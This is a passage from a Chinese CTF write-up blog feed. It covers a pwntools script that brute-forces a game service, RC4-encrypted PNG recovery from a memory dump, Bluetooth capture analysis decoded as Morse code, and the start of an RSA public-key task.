p.recvuntil(&#x27;你的分数：&#x27;.encode(encoding=&#x27;utf-8&#x27;))[-50:]</span><br>    out = p.recvrepeat(timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">180</span>:-<span class="hljs-number">50</span>]<br>    <span class="hljs-comment"># print(p.recvuntil(b&#x27;-----------------------------------&#x27;,drop=1),end=&#x27;\t&#x27;)</span><br>    <span class="hljs-comment"># print(out)</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        p.sendline(<span class="hljs-built_in">str</span>(i).encode())<br>        out = p.recvrepeat(timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">180</span>:-<span class="hljs-number">50</span>]<br>        <span class="hljs-built_in">print</span>(i, end=<span class="hljs-string">&#x27;\t&#x27;</span>)<br>        <span class="hljs-comment"># print(out)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;你赢了&#x27;</span>.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">in</span> out:<br>            winning_strategy.append(i)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;平局&#x27;</span>.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;Me10n赢了&#x27;</span>.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">in</span> out:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] pass&#x27;</span>)<br>        p.close()<br>        p = remote(link[<span class="hljs-number">1</span>], link[<span class="hljs-number">2</span>])<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> winning_strategy:<br>            p.sendline(<span class="hljs-built_in">str</span>(i).encode())<br>        <span class="hljs-comment"># print(out.decode(encoding=&#x27;utf8&#x27;, errors=&#x27;ignore&#x27;))</span><br>    p.close()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(winning_strategy), winning_strategy)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">success</span>():<br>    win = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> win:<br>        p.sendline(<span class="hljs-built_in">str</span>(i).encode())<br><br>success()<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="SpeedUp"><a href="#SpeedUp" class="headerlink" title="SpeedUp"></a>SpeedUp</h3><p><a href="https://oeis.org/A244060/list">https://oeis.org/A244060/list</a><br>直接接看2^27</p><h3 id="找到PNG了吗"><a href="#找到PNG了吗" class="headerlink" title="找到PNG了吗"></a>找到PNG了吗</h3><p>不太会Linux内存取证，用R-studio看了一下，没找到啥有用的东西，直接Strings 找到PNG了吗.mem（这个过程要耗一点时间，文件太大了）<br>然后在字符串中翻看到一处加密程序<br><img src="/mdimg/qwb2023/1.png"><br>主要加密函数如下，根据 rc4_encrypt_decrypt可以看出这是一个对文件进行RC4加密的程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">    <span class="hljs-built_in">int</span> a=<span class="hljs-number">0</span>;<br>    char q[<span class="hljs-number">10</span>];<br>    unsigned char key[]=<span class="hljs-string">&quot;do_not_care&quot;</span>;<br>    unsigned char key2[] = <span class="hljs-string">&quot;where_is_the_key&quot;</span>;<br>    FILE* file = fopen(<span class="hljs-string">&quot;have_your_fun.jocker&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br>    <span class="hljs-keyword">if</span> (file == NULL) &#123;<br>        printf(<span class="hljs-string">&quot;open file failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    unsigned char *<span class="hljs-built_in">str</span>;<br>    <span class="hljs-built_in">str</span> = (char *) malloc(<span class="hljs-number">20000</span>);<br>    memcpy(<span class="hljs-built_in">str</span>, buff, <span class="hljs-number">20000</span>);<br>rc4_encrypt_decrypt(key2, <span class="hljs-built_in">str</span>, <span class="hljs-number">20000</span>);<br>    printf(<span class="hljs-string">&quot;please give me the key of fun:&quot;</span>);<br>    scanf(<span class="hljs-string">&quot;%s&quot;</span>,q);<br>    rc4_encrypt_decrypt(key, <span class="hljs-built_in">str</span>, <span class="hljs-number">20000</span>);<br>    <br>    fwrite(buff, <span class="hljs-number">1</span>, <span class="hljs-number">20000</span>, file);<br>    printf(<span class="hljs-string">&quot;maybe you go wrong&quot;</span>);<br>    fclose(file);<br>    close(clientSocket);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>再根据题目信息猜测这个加密程序对发送的png图片做了处理，所以我们逆向思维去找加密后的png图片，以png文件头为特征值RC4加密得到，新的文件头<code>0e 3c b4 2f 99 96 95 56</code><br><img src="/mdimg/qwb2023/2.png"><br><img src="/mdimg/qwb2023/3.png"><br>往下翻，看到一些无效数据，所以在这里下断点，将上面的hex数据另存为文件，再用赛博厨子解密即可<br><img src="/mdimg/qwb2023/4.png"><br><a href="https://cyberchef.cn/#recipe=To_Hex('Space',0)RC4(%7B'option':'UTF8','string':'do_not_care'%7D,'Hex','Latin1')To_Hex('Space',0/disabled)Render_Image('Raw')&input=Djy0L5mWlVa%2Ba%2B/pQkhdGNUXemfs8DMUX0aar/xADCXQusOwoIskPQRXYX3sfWfZidGPJ1uM4Tk13pVKniN23LZXVSm7ZIGfFniwZwHKUxr%2B%2Bj0YkHCzR3BeQnszEuY/HCRN/mCwxzKm6NBbVj6SXUhMscmko8ugK7FhejOTl9ktAGE9NEcw/xWJVeXVA5nR9hVn13gAH9PDOHzgrnxFhARF64giI4Ou%2B6ROhmWuZMpGKt4LespSJNqj0r9XTrYVrWpF1qn9NXdC3GCO1NSd4Y7NtJFBWAzlMuXxIM5i3z64cLkspdQR0qRi33W5QvzE4KBt4%2Bp0u4Zwvl4RaMW3UGwA2lBrrjzOTMA%2Bbd4be7mru04srcktpuBuVkDGb6KJAXO74qu1QMx2wPFY2td5ohJtD4IZbsFp9G9oyYDg42IbaOSlPWxelCKDz0cZAqlzt6vEkbidlBsyoWyoi8hIYr2k%2BaZ8t8dpFHPBCg0C1a1xtnb5Myjr99vDQfNUVfJ7K1rlWLxw3ulb0M4dIde4SwlNsUjM0CMYOIWBlQHPFqNjSXQNoETanSap0%2Bkf2Ncblh5E6Z81Cd9AEE7NV4FIbyeKlLaFEhrUdBf0%2BGXG7LZs2bWsTW1zPG2H2CYndxh9SuNUyjJYmPhcr88yk65ePanzQdyAg9y3XJM8L4zry4YEAnfum%2BVdxXDT0C1yqJUUI1Ywmfy6yMjzaLwDeJmJiQJ93rT8y7kqnjki1uvDK%2BEl6BzMr3OWeGKlbci%2BdAPamVTscJsmWYHCRQgdP/U9FiJED5g05YFC6PJvR92gNpspbf8UcPkN4WstbLbmMYBx4Z/gVB%2BQhTSY0uAKge9gnBZtnmu5a2NQwapC9GFJVJ9kmWXW3kylTLCH69PDg9A4GOvCY7vjhL5DH%2BZWU7yTayn%2BPPYpksB98mgP1VcCQzk79xVcs8edOCcSAo4vNypAFYN4lMni%2BhvG3mo7xBwWdU1Wdd00xzyHyAAbpTgjgXpAvNh9luxmhzz31%2BQP9SnZitm1cqxIsFuokZzwA7RAbNYd14/CHRS3Y4TJ6Tb8IuiDqa2ERGh9GBMD6CYfOfVzH0sRrCG2X9l5Cz/8ZhG367j6ufk3ynT2RQlzkKz7kd/rU1o8fK0nIa2Mgm%2BHndMvfLF/hE85C1D0Dg3pEVOUJ4xt72Q10s%2BorlbGtNt6qLo%2BmlBasagWqffqp%2B0qFg%2BagkHu1d8/UEhOapAw3qtWd6iQ5c0kXRYeGfGJwJjkURuHTOMPxnN6anxqrp47GqKSU8DVjuCGnSbG%2BsMTygEMaaV/EfFhh/rJPckMLVuBvOjO49KsW6AoVkIji8ICEuDVQZE1o99p2hgTU7q91i/c0zdzYz8u%2BzVNo/A3znyPUrHO68mU47TzfD8s2tMGJW7%2BYHAnkR0D%2BD1f82tmchEtJmbt2bHBkEhNyU/MtFZ/h2LzeVBWdFXmDTRQVSunO5R7HkwwkH5Ao9PyhmfvO1N0aspxpKRykS1fv8GryvNwNm/z02x9mYt0HKPZVHMpsfrGomRXfV8%2BKQR5Jj%2BRExJJ4rD3CZpeOdwtCYY7cxHeWMNPdt8/8Y0CXMC0zKltpwF8D5jjVoqdMbaCxLkXlWxBiPUOTfIDKAOtd798t%2BDsvjV8fR6yCID3L4s1BV8%2B5/c6Oarc/1oh%2Bj65PbzeWJjrJHa4Ve18S0S/HZECA%2BhV6X37HW69TFSVGpJwes%2Bj0PM4Gj0MwHiE1WgVGzHk3oyQG015mTJkvgz0V8nQpA6%2BFHqHalh2YCR2gYJxLIBzVI/7iMzdQZVdsbZsPnLE9StlQfymRE1725udSzL%2BP8MXy5pyEJDHOLnhSamNywH0C8NaS/gwsziqwg3WyHH8pgJJ2iwPE/G6SjhWTO5f84iO10kAFeAo%2B0pbRSgxR4w04pflggZ6bVPJOP0VfmkalUVfI7ACsmPuiWSzA3ORRlKPOSDGAZR7/6t0trA/WiCS1fj9PoirpojrwWBj9EiAZstv2k7YeVk9T1qn4zXShqzpVlJA8H04AIThB5tMDVJb9CPZ%2Be3OAxmoF3ACWJaHNOz7U1TAgb25mvvYlL0VvuCAzEinFtW/exXt8aYeO0i4BAEmRLemzJSRNxl4100u3lqvGOgUvi8L%2BBOEh8X3fZnEgpbH8PFVrX%2BerZFH%2BXr3NavkhwJVJTAj0xt7c4V6V14iHLrItQSOtR0dSL8KY0pn9xFsAqIUehfjFOW6mGq8ZIAnbGopoqHGBNGfJj5QTMBsSG2WaxE4aBSIW7QiFy7E/5mHB23MM%2BKOLwXAHJIVU7eCdt/Cbvz412fZN0vL2et8hqlVXysZ4s4U6WHoMtm%2B6F7VpNB69NNgsmwoefLfOF3KF/ROsWgcee%2BJtHQ73SF9gG6tBV%2BcnkQa4FySWUVhGA9Sj3P2YBszCc01icoT1GoA3qtoAisVgzpLK00BjwNGfM3jrYdfFB4RK0aoapH1FNW8dS6bJ1UPWDUOj5Xfm0ucrqD0jxUdGbZrplg0M%2BgX4l9kIMXCwGfhaY%2Bo5IqAmmLaKvROgNo6n5DsgwEApK13o7k8EikxEbgw/Q5CFH28bpD/g6r3/jp0jlV65T2QgJx2ThzNNPntbd9oOZMcv4gJN%2BYSQ0tP4mKLyO15SbQVI1X0ND2aDqnhKv8Vw0mydEZMQOZUe11NERYJ7cAGBkL8gbNLNKcG6m1ZExBD/jp8ezd1a4rkaxY3S9zrHBJ80GnS%2BG%2BsqtYEVJ5MjvPIII9qJtoOk%2BWl1sF9XcBm/PI2HvZv/KHovD/3dr1OdLu6Dqf6EnJhfA92UwDj/VOAwGYxtt2l7gNeJ4lhT8mWm4jJe2UKW8nhGOeOgfhpPCkr7pt6GS8s%2Bubgx0lqrzM2f2Py9t5riRRGIXNROLBRWQvyn/42Kme8ql6%2B67fTliyxwY42E7OS1QEdtA6/Ys/HJWs9QZ7RMDGNtBY3%2BLwGy5NV92DzVPmycKCB4LhvRt1zfv1WVM/uWEYmqq5SVSbmR8AMW5lTT2WHMfnEhXj5leW17j/aQg5wmFX5kl8NTodyZ7OtesXKnP1dNIp%2BnJMhnm0dOqr/cK4XvbcoHcnAurnySVjAAO/tP3wRcp2K4IArX7QCkbLr92eFaX0TP%2BvVjmwYM9JTXNyBcfUu%2BcLIWGrUfQ0nQ0VeSgn0w96usmb6vXrDByWEKwfgl5dsUPBPKEttmPFAulPQpbs0ikCWRh23QYM9nr3aB66PNeHoE%2BjKQsQTUhVQUoJ9J7pukRyldlT//JxZylrKZcfYrgJtPDtjE%2BBFRq%2BbUjifVHeX2ejJW%2BvQJmsdAKOjdPzxKpjv/8D37LNEIImgnWWx14YoavYHTKfZn6Y%2BbSLuwEbgMnftSBqCPefltedjci87iGmMUsjnzBwRUVQtsaMeFtiREiGp8eyfHjiON1iV8SZUjxc62Y5zzVlwf0geBTpISiJ4QbwMmdfXRPSBWAxUGs/ukuI1mZZzTq3n%2BESl7Z09UE5sHAOBQnZTV4jsxI3Mh3cnXg%2BbUUGibNa4uI/211zUWvZr0mScnwj0GRbc%2B5QZF5ZnAE5D33nyhNy8iAemQhBYaJQSzJgs8tcMLgi7igehuAN79gHPHfLteDrJlXPAXMnGgsMKxxoXaR9RE7S2ak1lDSdDxVcb6VwU2/You47Huy/Bk/aQS48I%2BK6L795qpdwoeL6Gf2A/3Qv86eKjAZNxquVez6lFzmncLLWEl2WGH4zR47IeZzATtY%2BnCkoYyqyeJyVK6a67oUAzB0Pf1tXrZ%2BXZGMsZmHocQdABbrxLaSh7zVCeklSaGAf3qYlQolE9kd7AOdEq7eOyyNZSZQRnGvTHsIx%2BvU1MIt62jGB5Gou9cwz7zcAjPrm9OqUMR3IIgj8qZdFjzzJ8oUcHifK1BOaB7lo2TmCZchd9yrm%2BikNFTAAAAAAAAAAAIF37vXZVAAAAAP6mHjYAAAEAAAAAAAAAoDI46WZ/">https://cyberchef.cn/#recipe=To_Hex(‘Space’,0)RC4(%7B’option’:’UTF8’,’string’:’do_not_care’%7D,’Hex’,’Latin1’)To_Hex(‘Space’,0/disabled)Render_Image(‘Raw’)&amp;input=Djy0L5mWlVa%2Ba%2B/pQkhdGNUXemfs8DMUX0aar/xADCXQusOwoIskPQRXYX3sfWfZidGPJ1uM4Tk13pVKniN23LZXVSm7ZIGfFniwZwHKUxr%2B%2Bj0YkHCzR3BeQnszEuY/HCRN/mCwxzKm6NBbVj6SXUhMscmko8ugK7FhejOTl9ktAGE9NEcw/xWJVeXVA5nR9hVn13gAH9PDOHzgrnxFhARF64giI4Ou%2B6ROhmWuZMpGKt4LespSJNqj0r9XTrYVrWpF1qn9NXdC3GCO1NSd4Y7NtJFBWAzlMuXxIM5i3z64cLkspdQR0qRi33W5QvzE4KBt4%2Bp0u4Zwvl4RaMW3UGwA2lBrrjzOTMA%2Bbd4be7mru04srcktpuBuVkDGb6KJAXO74qu1QMx2wPFY2td5ohJtD4IZbsFp9G9oyYDg42IbaOSlPWxelCKDz0cZAqlzt6vEkbidlBsyoWyoi8hIYr2k%2BaZ8t8dpFHPBCg0C1a1xtnb5Myjr99vDQfNUVfJ7K1rlWLxw3ulb0M4dIde4SwlNsUjM0CMYOIWBlQHPFqNjSXQNoETanSap0%2Bkf2Ncblh5E6Z81Cd9AEE7NV4FIbyeKlLaFEhrUdBf0%2BGXG7LZs2bWsTW1zPG2H2CYndxh9SuNUyjJYmPhcr88yk65ePanzQdyAg9y3XJM8L4zry4YEAnfum%2BVdxXDT0C1yqJUUI1Ywmfy6yMjzaLwDeJmJiQJ93rT8y7kqnjki1uvDK%2BEl6BzMr3OWeGKlbci%2BdAPamVTscJsmWYHCRQgdP/U9FiJED5g05YFC6PJvR92gNpspbf8UcPkN4WstbLbmMYBx4Z/gVB%2BQhTSY0uAKge9gnBZtnmu5a2NQwapC9GFJVJ9kmWXW3kylTLCH69PDg9A4GOvCY7vjhL5DH%2BZWU7yTayn%2BPPYpksB98mgP1VcCQzk79xVcs8edOCcSAo4vNypAFYN4lMni%2BhvG3mo7xBwWdU1Wdd00xzyHyAAbpTgjgXpAvNh9luxmhzz31%2BQP9SnZitm1cqxIsFuokZzwA7RAbNYd14/CHRS3Y4TJ6Tb8IuiDqa2ERGh9GBMD6CYfOfVzH0sRrCG2X9l5Cz/8ZhG367j6ufk3ynT2RQlzkKz7kd/rU1o8fK0nIa2Mgm%2BHndMvfLF/hE85C1D0Dg3pEVOUJ4xt72Q10s%2BorlbGtNt6qLo%2BmlBasagWqffqp%2B0qFg%2BagkHu1d8/UEhOapAw3qtWd6iQ5c0kXRYeGfGJwJjkURuHTOMPxnN6anxqrp47GqKSU8DVjuCGnSbG%2BsMTygEMaaV/EfFhh/rJPckMLVuBvOjO49KsW6AoVkIji8ICEuDVQZE1o99p2hgTU7q91i/c0zdzYz8u%2BzVNo/A3znyPUrHO68mU47TzfD8s2tMGJW7%2BYHAnkR0D%2BD1f82tmchEtJmbt2bHBkEhNyU/MtFZ/h2LzeVBWdFXmDTRQVSunO5R7HkwwkH5Ao9PyhmfvO1N0aspxpKRykS1fv8GryvNwNm/z02x9mYt0HKPZVHMpsfrGomRXfV8%2BKQR5Jj%2BRExJJ4rD3CZpeOdwtCYY7cxHeWMNPdt8/8Y0CXMC0zKltpwF8D5jjVoqdMbaCxLkXlWxBiPUOTfIDKAOtd798t%2BDsvjV8fR6yCID3L4s1BV8%2B5/c6Oarc/1oh%2Bj65PbzeWJjrJHa4Ve18S0S/HZECA%2BhV6X37HW69TFSVGpJwes%2Bj0PM4Gj0MwHiE1WgVGzHk3oyQG015mTJkvgz0V8nQpA6%2BFHqHalh2YCR2gYJxLIBzVI/7iMzdQZVdsbZsPnLE9StlQfymRE1725udSzL%2BP8MXy5pyEJDHOLnhSamNywH0C8NaS/gwsziqwg3WyHH8pgJJ2iwPE/G6SjhWTO5f84iO10kAFeAo%2B0pbRSgxR4w04pflggZ6bVPJOP0VfmkalUVfI7ACsmPuiWSzA3ORRlKPOSDGAZR7/6t0trA/WiCS1fj9PoirpojrwWBj9EiAZstv2k7YeVk9T1qn4zXShqzpVlJA8H04AIThB5tMDVJb9CPZ%2Be3OAxmoF3ACWJaHNOz7U1TAgb25mvvYlL0VvuCAzEinFtW/exXt8aYeO0i4BAEmRLemzJSRNxl4100u3lqvGOgUvi8L%2BBOEh8X3fZnEgpbH8PFVrX%2BerZFH%2BXr3NavkhwJVJTAj0xt7c4V6V14iHLrItQSOtR0dSL8KY0pn9xFsAqIUehfjFOW6mGq8ZIAnbGopoqHGBNGfJj5QTMBsSG2WaxE4aBSIW7QiFy7E/5mHB23MM%2BKOLwXAHJIVU7eCdt/Cbvz412fZN0vL2et8hqlVXysZ4s4U6WHoMtm%2B6F7VpNB69NNgsmwoefLfOF3KF/ROsWgcee%2BJtHQ73SF9gG6tBV%2BcnkQa4FySWUVhGA9Sj3P2YBszCc01icoT1GoA3qtoAisVgzpLK00BjwNGfM3jrYdfFB4RK0aoapH1FNW8dS6bJ1UPWDUOj5Xfm0ucrqD0jxUdGbZrplg0M%2BgX4l9kIMXCwGfhaY%2Bo5IqAmmLaKvROgNo6n5DsgwEApK13o7k8EikxEbgw/Q5CFH28bpD/g6r3/jp0jlV65T2QgJx2ThzNNPntbd9oOZMcv4gJN%2BYSQ0tP4mKLyO15SbQVI1X0ND2aDqnhKv8Vw0mydEZMQOZUe11NERYJ7cAGBkL8gbNLNKcG6m1ZExBD/jp8ezd1a4rkaxY3S9zrHBJ80GnS%2BG%2BsqtYEVJ5MjvPIII9qJtoOk%2BWl1sF9XcBm/PI2HvZv/KHovD/3dr1OdLu6Dqf6EnJhfA92UwDj/VOAwGYxtt2l7gNeJ4lhT8mWm4jJe2UKW8nhGOeOgfhpPCkr7pt6GS8s%2Bubgx0lqrzM2f2Py9t5riRRGIXNROLBRWQvyn/42Kme8ql6%2B67fTliyxwY42E7OS1QEdtA6/Ys/HJWs9QZ7RMDGNtBY3%2BLwGy5NV92DzVPmycKCB4LhvRt1zfv1WVM/uWEYmqq5SVSbmR8AMW5lTT2WHMfnEhXj5leW17j/aQg5wmFX5kl8NTodyZ7OtesXKnP1dNIp%2BnJMhnm0dOqr/cK4XvbcoHcnAurnySVjAAO/tP3wRcp2K4IArX7QCkbLr92eFaX0TP%2BvVjmwYM9JTXNyBcfUu%2BcLIWGrUfQ0nQ0VeSgn0w96usmb6vXrDByWEKwfgl5dsUPBPKEttmPFAulPQpbs0ikCWRh23QYM9nr3aB66PNeHoE%2BjKQsQTUhVQUoJ9J7pukRyldlT//JxZylrKZcfYrgJtPDtjE%2BBFRq%2BbUjifVHeX2ejJW%2BvQJmsdAKOjdPzxKpjv/8D37LNEIImgnWWx14YoavYHTKfZn6Y%2BbSLuwEbgMnftSBqCPefltedjci87iGmMUsjnzBwRUVQtsaMeFtiREiGp8eyfHjiON1iV8SZUjxc62Y5zzVlwf0geBTpISiJ4QbwMmdfXRPSBWAxUGs/ukuI1mZZzTq3n%2BESl7Z09UE5sHAOBQnZTV4jsxI3Mh3cnXg%2BbUUGibNa4uI/211zUWvZr0mScnwj0GRbc%2B5QZF5ZnAE5D33nyhNy8iAemQhBYaJQSzJgs8tcMLgi7igehuAN79gHPHfLteDrJlXPAXMnGgsMKxxoXaR9RE7S2ak1lDSdDxVcb6VwU2/You47Huy/Bk/aQS48I%2BK6L795qpdwoeL6Gf2A/3Qv86eKjAZNxquVez6lFzmncLLWEl2WGH4zR47IeZzATtY%2BnCkoYyqyeJyVK6a67oUAzB0Pf1tXrZ%2BXZGMsZmHocQdABbrxLaSh7zVCeklSaGAf3qYlQolE9kd7AOdEq7eOyyNZSZQRnGvTHsIx%2BvU1MIt62jGB5Gou9cwz7zcAjPrm9OqUMR3IIgj8qZdFjzzJ8oUcHifK1BOaB7lo2TmCZchd9yrm%2BikNFTAAAAAAAAAAAIF37vXZVAAAAAP6mHjYAAAEAAAAAAAAAoDI46WZ/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>强网杯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Teslaaaaa</title>
    <link href="/2023/11/27/2020%E7%BD%91%E9%BC%8E%E6%9D%AFTeslaaaaa/"/>
    <url>/2023/11/27/2020%E7%BD%91%E9%BC%8E%E6%9D%AFTeslaaaaa/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/Teslaaaaa/1.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoV</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一些蓝牙流量分析</title>
    <link href="/2023/11/26/%E8%93%9D%E7%89%99%E6%B5%81%E9%87%8F/"/>
    <url>/2023/11/26/%E8%93%9D%E7%89%99%E6%B5%81%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="2023数字中国·数据安全产业人才能力挑战赛初赛"><a href="#2023数字中国·数据安全产业人才能力挑战赛初赛" class="headerlink" title="2023数字中国·数据安全产业人才能力挑战赛初赛"></a>2023数字中国·数据安全产业人才能力挑战赛初赛</h2><h3 id="Are-you-ok"><a href="#Are-you-ok" class="headerlink" title="Are you ok"></a>Are you ok</h3><p>题目给了一个日志文件，打开是乱码，但根据其中的明文<code>HUAWEI P10 Plus</code>和<code>Mi Smart Band 5</code>猜测是蓝牙流量，用Wireshark打开。<br>大概过程是刚开始两台设备进行了认证通信，然后互相发送了一些信息，实在看不懂蓝牙流量😒<br>在这里我们直接根据<code>info</code>排序，发现Handle为<code>0x0026</code>的通信最长，符合flag的特征<br><img src="/mdimg/Bluetooth/1.png"><br>通过观察发现，Opcode的Value有<code>0x00</code>，<code>0x01</code>，<code>0x02</code>三种，猜测是莫斯编码</p><table><thead><tr><th align="center">Value</th><th align="center">0x00</th><th align="center">0x01</th><th align="center">0x02</th></tr></thead><tbody><tr><td align="center">Morse</td><td align="center">.</td><td align="center">-</td><td align="center">/</td></tr></tbody></table><p>写脚本将所有通信过程打印出来，并转化为Morse电码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyshark<br><br>pcap = pyshark.FileCapture(<span class="hljs-string">&#x27;1.pcap&#x27;</span>, display_filter = <span class="hljs-string">&#x27;btatt.opcode == 0x52&#x27;</span>)<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> pkt <span class="hljs-keyword">in</span> pcap:<br>    opcode = <span class="hljs-built_in">str</span>(pkt.btatt.value)<br>    <span class="hljs-keyword">if</span> opcode == <span class="hljs-string">&#x27;00&#x27;</span>:<br>        flag += <span class="hljs-string">&#x27;.&#x27;</span><br>    <span class="hljs-keyword">elif</span> opcode == <span class="hljs-string">&#x27;01&#x27;</span>:<br>        flag += <span class="hljs-string">&#x27;-&#x27;</span><br>    <span class="hljs-keyword">elif</span> opcode == <span class="hljs-string">&#x27;02&#x27;</span>:<br>        flag += <span class="hljs-string">&#x27;/&#x27;</span><br><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment"># .../--../--../--./...-/--/./...../-----</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/Bluetooth/2.png"></p><h2 id="Cyber-Apocalypse-2021"><a href="#Cyber-Apocalypse-2021" class="headerlink" title="Cyber Apocalypse 2021"></a>Cyber Apocalypse 2021</h2><h3 id="Low-Energy-Crypto"><a href="#Low-Energy-Crypto" class="headerlink" title="Low Energy Crypto"></a>Low Energy Crypto</h3><p>直接根据<code>info</code>排序，发现Handle为<code>0x0016</code>的通信中有一个RSA的公钥<br><img src="/mdimg/Bluetooth/3.png"><br>将公钥导出</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">-----BEGIN <span class="hljs-keyword">PUBLIC</span> <span class="hljs-keyword">KEY</span>-----<br>MGowDQYJKoZIhvcNAQEBBQADWQAwVgJBAKKPHxnmkWVC4fje7KMbWZf07zR10D0m<br>B9fjj4tlGekPOW+f8JGzgYJRWboekcnZfiQrLRhA3REn1lUKkRAnUqAkCEQDL/<span class="hljs-number">3L</span>i<br><span class="hljs-number">4l</span>+RI2g0FqJvf3ff<br>-----<span class="hljs-keyword">END</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-keyword">KEY</span>-----<br></code></pre></td></tr></table></figure><p>用openssl转换一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 